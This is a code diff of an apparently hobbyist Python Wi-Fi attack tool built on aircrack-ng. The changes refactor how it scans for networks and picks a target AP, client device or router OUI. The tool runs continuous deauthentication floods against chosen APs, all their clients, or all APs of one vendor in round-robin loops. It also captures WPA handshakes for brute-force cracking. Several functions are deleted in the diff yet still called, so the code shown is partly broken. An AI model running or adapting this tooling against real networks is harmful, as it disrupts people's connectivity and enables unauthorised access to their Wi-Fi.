@@ -17,13 +17,16 @@ target_device = ""
 target_ap_authentication = ""
 target_router_oui = ""
 interface_mac_address = ""
-
+ap_list_of_target_oui = []
+device_list_of_target_ap = []
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 
+ssid_map = {}
+ssid_counter = ''
 terminal_pids = []
+target_ap_key = 0
 terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                       (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left
-
 
 def check_for_q_press(interval=0.1, timeout=3):
     start_time = time.time()
@@ -32,6 +35,8 @@ def check_for_q_press(interval=0.1, timeout=3):
             return True
         time.sleep(interval)
     return False
+
+
 def get_screen_resolution():
     output = check_command_output("xdpyinfo | grep dimensions")
     resolution = output.split()[1].split('x')
@@ -146,7 +151,8 @@ def popen_command_new_terminal(command):
             else:  # xterm
                 terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
             # print(f"Executing command: {terminal_command}\n")
-            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, text=True)
             terminal_pids.append(process.pid)
             return process
 
@@ -248,14 +254,37 @@ def spoof_mac_of_interface_with_random_byte():
     get_mac_of_interface()
 
 
-
-def scan_for_networks():
+def select_target_ap(scan=True):
     clear()
     global target_ap
     global target_bssid
     global target_channel
     global target_ap_authentication
-    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=7)
+    if scan:
+        scan_for_networks()
+    while 1:
+        for key, value in ssid_map.items():
+            print("{:<2} {:<35} {:<17} {:<8} {:<2} {:<3}".format(f'{cyan(key)})', blue(value[0]), yellow(value[1]),
+                                                                 green(value[2]), cyan(value[3]),
+                                                                 magenta(value[4])))
+
+        print('\nif desired SSID is not listed, please return and scan again.')
+        selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
+        if selection == 'exit':
+            break
+        elif selection.isnumeric():
+            if len(ssid_map) >= int(selection) > 0:
+                target_ap = ssid_map[int(selection)][0]
+                target_bssid = ssid_map[int(selection)][1]
+                target_channel = ssid_map[int(selection)][3]
+                target_ap_authentication = ssid_map[int(selection)][4]
+            elif int(selection) > len(ssid_map):
+                print(f'Selected interface ({selection}) {red("does not exist")}')
+def scan_for_networks():
+    clear()
+    global ssid_map
+    global ssid_counter
+    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
     if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
         start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
         end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
@@ -266,186 +295,58 @@ def scan_for_networks():
             return
         else:
             output = output[start_index:end_index]
-        SSIDS = []
+        found_SSIDS = []
         ssid_counter = 0
-        ssids_print_list = []
         for row in output.split('\n'):
             column = row.split()
-            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(column[10]) == ']['  and not str(
+            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
+                    column[10]) == '][' and not str(
                     column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
-                if column[10] not in [ssid[1] for ssid in SSIDS]:
+                if column[10] not in [ssid[1] for ssid in found_SSIDS]:
                     ssid_counter += 1
-                    SSIDS.append([ssid_counter, column[10]])
-                    # print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
-                    if column[-3] == 'SAE':
-                        authentication = red(column[-3])
-                    elif column[-3] == 'PSK':
-                        authentication = yellow(column[-3])
-                    else:
-                        authentication = ''
-                    ssids_print_list.append(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]} {authentication}')
-        while 1:
-            clear()
-            for i in ssids_print_list:
-                print(i)
-            print('\nif desired SSID is not listed, please return and scan again.')
-            selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
-            if selection == 'exit':
-                break
-            elif selection.isnumeric():
-                if ssid_counter >= int(selection) > 0:
-                    target_ap = SSIDS[int(selection) - 1][1]
-                    while 1:
-                        try:
-                            target_bssid, target_channel, target_ap_authentication = get_bssid_and_station_from_ap()
-                            return
-                        except TypeError:
-                            if input(f'\n\n{green("Press Enter to retry : ")}').lower() != '':
-                                target_ap = ''
-                                return
-                    return
-                elif int(selection) > ssid_counter:
-                    print(f'Selected interface ({selection}) {red("does not exist")}')
+                    found_SSIDS.append([ssid_counter, column[10]])
+                    ssid_map[ssid_counter] = [column[10],column[0],column[0][:8],column[5],column[-3]]
     else:
         print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
         print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
 
 
-def get_bssid_and_station_from_ap():
-  
-    def recursion():
-        while 1:
-            selection = input('Rerun the Scan  Y/N ').lower()
-            if selection == 'y':
-                return get_bssid_and_station_from_ap()
-            elif selection == 'n':
-                clear()
-                print(
-                    f'this message is from {green("get_bssid_and_station_from_ap")} \n',
-                    f'No {red("target_bssid")} and {red("target_channel")} will be set ',)
-                input('Press enter to return : ')
-                return None
-            return
-
-    clear()
-    print(f'Gathering Information on {target_ap}')
-    output, error = popen_command(f'airodump-ng -N {target_ap} {selected_interface}', killtime=3)
-    if 'Failed initializing wireless card(s)' in output:
-        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
-        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
-        return
-    elif target_ap not in output:
+def deauthentication(target=target_bssid):
+    if target == target_bssid:
+        popen_command_new_terminal(
+            f'aireplay-ng --deauth 0 -a {target} --ignore-negative-one {selected_interface}')
+    elif target == target_device:
+        popen_command_new_terminal(
+            f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')
+def deauthentication_interval(interval=0):
+    aireplay = popen_command_new_terminal(
+        f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
+    interval_time = interval
+    while interval_time > 0:
         print(
-            f'Scan was successful but {green(target_ap)} is {red("not found")}.')
-        recursion()
-        return
-    else:
-        for column in output.split('\n'):
-            row = column.split()
-            if row[-2] and row[1]:
-                if row[-2] == target_ap and len(row[1]) == 17:
-                    return row[1], row[6], row[-3]
-
-
-def deauth(interval=0, time_limit=0):
-    if interval:
-        aireplay = popen_command_new_terminal(
-            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
-        interval_time = interval
-        while interval_time > 0:
-            print(
-                f"Deauthenticating {green(target_ap)}. Remaining time {green(interval_time)} Press Q repeatedly to cancel")
-            if keyboard.is_pressed('q'):
-                print("Loop canceled by user.")
-                interval_time = 1
-            time.sleep(1)
-            interval_time -= 1
-        try:
-            os.killpg(aireplay.pid, signal.SIGTERM)
-            aireplay.wait()
-
-        except ProcessLookupError:
-            print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {red(ProcessLookupError)}")
-        return
-
-    elif time_limit:
-        aireplay = popen_command_new_terminal(
-            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
-        time.sleep(time_limit)
-        try:
-            os.killpg(aireplay.pid, signal.SIGTERM)
-            aireplay.wait()
-        except ProcessLookupError:
-            print(
-                f"This error occurs when airodump terminates unexpectedly {red(ProcessLookupError)}")
-        return
-    else:
-        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
-
-
-def deauth_target_device(interval=0):
-    if not target_ap:
-        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
-        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
-        return
-    elif not target_device:
-        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target Device")} to continue with this attack')
-        if input('Select a {yellow("target Device")} Y/N : ').lower() == 'y':
-            select_target_device()
-        return
-    clear()
-    if not interval:
-        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {selected_interface}')
-        print(f'Deauthenticating {green(target_device)} in {green(target_ap)} Press enter to return : ')
-        os.killpg(aireplay.pid, signal.SIGTERM)
-    if interval:
-        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {selected_interface}')
-        time.sleep(interval)
-        os.killpg(aireplay.pid, signal.SIGTERM)
-
-
-def select_target_oui():
-    global target_router_oui
-    clear()
-    popen_command(f'airodump-ng -w temp_output --output-format csv {selected_interface}', killtime=10)
-    with open('temp_output-01.csv', 'r') as f:
-        reader = csv.reader(f)
-        data = [(row[0], row[-2]) for row in reader if len(row) >= 13 and ':' in row[0]]
-    # Sort data by OUI
-    data.sort(key=lambda x: x[0][:8])
-    current_oui = ''
-    print_list = []
-    oui_list = []
-    for mac, ssid in data:
-        oui = mac[:8]
-        if oui != current_oui and ssid != '' and oui != '00:00:00':
-            current_oui = oui
-            oui_list.append(oui)
-            print_list.append(f"OUI: {yellow(oui)}")
-        print_list.append(f" - {blue(ssid)} : {mac}")
-    remove_files_with_prefix(os.getcwd(), 'temp_output')
-    clear()
-    for i in print_list:
-        print(f'{i}\n')
-    while 1:
-        print(f'{blue("----------------------------------------------------------------------")}')
-        selected_oui = input(f'Select an {yellow("OUI")} from the output / {red("999")} to cancel : ').replace(f" ", "")
-        if selected_oui == '999':
+            f"Deauthenticating {green(target_bssid)}. Remaining time {green(interval_time)} Press Q to cancel")
+        if check_for_q_press(timeout=1):
+            print("Loop canceled by user.")
             return
-        elif selected_oui in oui_list:
-            target_router_oui = selected_oui
-            return
-        else:
-            print(print_list)
-            print(f'Selected {yellow("OUI")} ({green(selected_oui)}) {red("does not exist")}')
+        interval_time -= 1
+    try:
+        os.killpg(aireplay.pid, signal.SIGKILL)
+        aireplay.wait()
+    except ProcessLookupError:
+        return
+
+#TODO TODO TODO TODO
+
 
 
 def select_target_device():
+    global device_list_of_target_ap
+    device_list_of_target_ap = []
     if not target_ap:
-        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
+        print(
+            f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
         if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
+            select_target_ap()
         return
     global target_device
     clear()
@@ -472,6 +373,8 @@ def select_target_device():
             if selection.isnumeric():
                 if counter >= int(selection) > 0:
                     target_device = devices[int(selection) - 1]
+                    for device in devices:
+                        device_list_of_target_ap.append(device)
                     return
                 elif int(selection) > counter:
                     print(f'Selected device ({selection}) {red("does not exist")}')
@@ -479,76 +382,61 @@ def select_target_device():
         input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
         return
 
-def deauth_devices_in_target_ap():
 
+def deauth_devices_in_target_ap():
     global target_device
     clear()
     if not target_ap:
-        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
+        print(
+            f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
         if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
+            select_target_ap()
         return
     Save_target_device = target_device
-    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=10)
 
-    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
-        devices = []
-        for column in output.split('\n'):
-            row = column.split()
-            if len(row) >= 3 and len(row[2]) == 17:
-                if row[2] not in devices:
-                    devices.append(row[2])
-        if devices:
-            clear()
-            print(
-                f'{green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}\n')
-            for device in devices:
-                print(yellow(device))
+    if device_list_of_target_ap:
+        clear()
+        print(
+            f'{green(str(len(device_list_of_target_ap)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}\n')
+        for device in device_list_of_target_ap:
+            print(yellow(device))
 
-            print(f"{blue('---------------------------------------')}\n",
-                  "1   : Deauth all devices once and quit\n",
-                  "2   : Deauth all devices roundrobin\n",
-                  "999 : Quit\n")
-            while 1:
-                selection = input("Choose an option : ")
-                if selection == '999':
-                    return
-                elif selection == '1':
-                    for device in devices:
+        print(f"{blue('---------------------------------------')}\n",
+              "1   : Deauth all devices once and quit\n",
+              "2   : Deauth all devices roundrobin\n",
+              "999 : Quit\n")
+        while 1:
+            selection = input("Choose an option : ")
+            if selection == '999':
+                return
+            elif selection == '1':
+                for device in device_list_of_target_ap:
+                    clear()
+                    print(f"Deauthing {device} for 60 seconds")
+                    target_device = device
+                    deauth_target_device(interval=60)
+                target_device = Save_target_device
+                return
+            elif selection == '2':
+                rr_counter = 0
+                while 1:
+                    for device in device_list_of_target_ap:
                         clear()
                         print(f"Deauthing {device} for 60 seconds")
                         target_device = device
                         deauth_target_device(interval=60)
-                    target_device = Save_target_device
-                    return
-                elif selection == '2':
-                    rr_counter = 0
-                    while 1:
-                        for device in devices:
-                            clear()
-                            print(f"Deauthing {device} for 60 seconds")
-                            target_device = device
-                            deauth_target_device(interval=60)
-                        rr_counter += 1
-                        print(
-                            f"each SSID in {green(target_ap)} has been Deauthenticated for {green(rr_counter)} times")
-                        print(
-                            f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
+                    rr_counter += 1
+                    print(
+                        f"each SSID in {green(target_ap)} has been Deauthenticated for {green(rr_counter)} times")
+                    print(
+                        f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
 
-                        if check_for_q_press():
-                            print("Loop canceled by user.")
-                            target_device = Save_target_device
-                            return
-        else:
-            input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
+                    if check_for_q_press():
+                        print("Loop canceled by user.")
+                        target_device = Save_target_device
+                        return
     else:
-        print(f'f{blue("-------------------------------------------------------------")}')
-        print(f'This message is from {green("deaunth_devices_in_target_ap")}')
-        print(f'There is a problem with {red("airodump-ng")}')
-        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
-        print(f'{red("AIRODUMP-NG STDERR ::")}\n{red(str(error))}')
-        input(f'Press enter to return :  \n')
-        return
+        input(f'No Device is connected to {green(target_bssid)} Press enter to return : ')
 
 
 def remove_files_with_prefix(directory, prefix):
@@ -568,6 +456,7 @@ def remove_files_with_prefix(directory, prefix):
 
 
 def capture_handshake():
+    clear()
 
     def recursion():
         selection = input('\n Do you want to try again Y/N : ').lower()
@@ -581,7 +470,7 @@ def capture_handshake():
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue with this attack')
         if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
+            select_target_ap()
         return
     if target_ap_authentication == 'PSK':
         input(target_ap_authentication)
@@ -600,7 +489,8 @@ def capture_handshake():
 
         aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')
 
-        airodump = popen_command_new_terminal(f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')
+        airodump = popen_command_new_terminal(
+            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')
 
         time.sleep(30)
 
@@ -650,14 +540,17 @@ def capture_handshake():
         input(f"Press enter to return and select a AP that uses all use {yellow('PSK')} Authentication")
         return
 
+
 def switch_interface_channel():
     run_command(f'iwconfig {selected_interface} channel {target_channel}')
 
+
 def capture_packets():
+    clear()
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue with this attack')
         if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
+            select_target_ap()
         return
     output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
     if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
@@ -668,7 +561,8 @@ def capture_packets():
         target_directory = f'/tmp/{target_ap}-Captures'
         os.makedirs(target_directory, exist_ok=True)
         airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
-        airodump = popen_command_new_terminal(f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_capture_location} {selected_interface}')
+        airodump = popen_command_new_terminal(
+            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_capture_location} {selected_interface}')
         time.sleep(30)
         clear()
         try:
@@ -688,42 +582,48 @@ def capture_packets():
         input(f'Press enter to return :  ')
         return
 
+
 # TODO
 def deauth_by_oui():
+    clear()
     if not target_router_oui:
         print(f"Select a {yellow('target OUI')} to continue with this attack")
         if input(f"Select a {yellow('target OUI')} target Y/N : ").lower() == 'y':
             select_target_oui()
         return
-    global target_ap
-    STORE_target_ap = target_ap
-
-    all_ap_on_oui = []
-    if SSIDs_in_oui_output:
-        clear()
-        print(f"List of SSIDs in {target_router_oui}")
-        for SSID in SSIDs_in_oui_output:
-            print(f"{green(SSID)}")
-        print(f"{blue('---------------------------------------')}\n",
-              "1   : Deauth all devices once and quit\n",
-              "2   : Deauth all devices roundrobin\n",
-              "999 : Quit\n")
+    global target_bssid
+    store_target_bssid = target_bssid
+    if ap_list_of_target_oui:
+        print(f"{blue('---------------------------------------')}")
+        print(f"List of AP's in {yellow(target_router_oui)}")
+        for bssid in ap_list_of_target_oui:
+            print(f"{green(bssid)}")
+        print(f"{blue('---------------------------------------')}")
+        print(f"1   : Deauth all AP's once and quit")
+        print(f"2   : Deauth all AP's roundrobin")
+        print(f"{blue('---------------------------------------')}")
+        print("999 : Quit\n")
         while 1:
             selection = input("Choose an option : ")
             if selection == '999':
                 return
             elif selection == '1':
-                for SSID in SSIDs_in_oui_output:
-                    target_ap = SSID
+                for bssid in ap_list_of_target_oui:
+                    clear()
+                    target_bssid = bssid
+                    print(f"Deauthing {bssid} for 60 seconds")
                     deauth(interval=60)
-                target_ap = STORE_target_ap
+                target_bssid = store_target_bssid
+                print(f"Deauthed all AP's in {green(target_router_oui)} for 60 seconds")
+                input(f"Press enter to return : ")
                 return
             elif selection == '2':
                 rr_counter = 0
                 while 1:
-                    for SSID in SSIDs_in_oui_output:
+                    for bssid in ap_list_of_target_oui:
                         clear()
-                        print(f"Deauthing {SSID}")
+                        target_bssid = bssid
+                        print(f"Deauthing {bssid} for 60 seconds")
                         deauth(interval=60)
                     rr_counter += 1
                     print(
@@ -731,19 +631,21 @@ def deauth_by_oui():
                     print(
                         f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                     if check_for_q_press():
-                        print("Loop canceled by user.")
-                        target_ap = STORE_target_ap
+                        clear()
+                        target_bssid = store_target_bssid
+                        input("Loop canceled by user input, Press enter to return : ")
                         return
     else:
-        print(f"No SSID found in f{target_router_oui}")
+        input(f"No AP found in f{green('target_router_oui')} Press enter to return : ")
     return
+
 
 # TODO
 def bruteforce_handshake_capture():
     if not target_ap:
         print(f'Select a {yellow("target AP")} to continue with this attack')
         if input(f'Select a {yellow("target AP")} Y/N : ').lower() == 'y':
-            scan_for_networks()
+            select_target_ap()
         return
     search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
     matches = glob.glob(search_pattern)
@@ -1147,6 +1049,8 @@ if __name__ == "__main__":
             f"{green('2)')} Select a {yellow('target OUI')} (All AP`s in a specific Router) {red('from ver 1 not updated yet')}",
             f"{green('3)')} Select a {yellow('target Device')} in {yellow('target AP')}",
             f"{blue('------------------------------------------------------------------')}",
+            f"{green('U)')} UPDATE NETWORK INFORMATION",
+            f"{blue('------------------------------------------------------------------')}",
             f"{green('D1)')} Deauth {yellow('target AP')}",
             f"{green('D2)')} Deauth {yellow('target Device')} in {yellow('target AP')}",
             f"{green('D3)')} Deauth all AP`s in selected OUI (w/ interval or roundrobin) ",
@@ -1206,7 +1110,7 @@ if __name__ == "__main__":
                 if Section[0] == "Interface":
                     change_interface()
                 elif Section[0] == "Wireless":
-                    scan_for_networks()
+                    select_target_ap()
 
             case '2':
                 if Section[0] == "Interface":
@@ -1227,7 +1131,7 @@ if __name__ == "__main__":
                 if Section[0] == "Wireless" and target_ap == "":
                     print('Select a target AP to continue with this attack')
                     if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
+                        select_target_ap()
                 elif Section[0] == "Wireless":
                     deauth()
 
@@ -1256,7 +1160,7 @@ if __name__ == "__main__":
                 if Section[0] == "Wireless" and target_ap == "":
                     print('Select a target AP and to continue with this attack')
                     if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
+                        select_target_ap()
                 elif Section[0] == "Wireless":
                     airdecap_wpa(target_ap)
 
@@ -1268,7 +1172,7 @@ if __name__ == "__main__":
                 if Section[0] == "Wireless" and target_ap == "":
                     print('Select a target AP and to continue with this attack')
                     if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
+                        select_target_ap()
                 elif Section[0] == "Wireless":
                     besside_target_ap()
 
@@ -1276,7 +1180,7 @@ if __name__ == "__main__":
                 if Section[0] == "Wireless" and target_ap == "":
                     print('Select a target AP and to continue with this attack')
                     if input('Select a target Y/N').lower() == 'y':
-                        scan_for_networks()
+                        select_target_ap()
                 elif Section[0] == "Wireless":
                     graph_networks(target_ap)
 
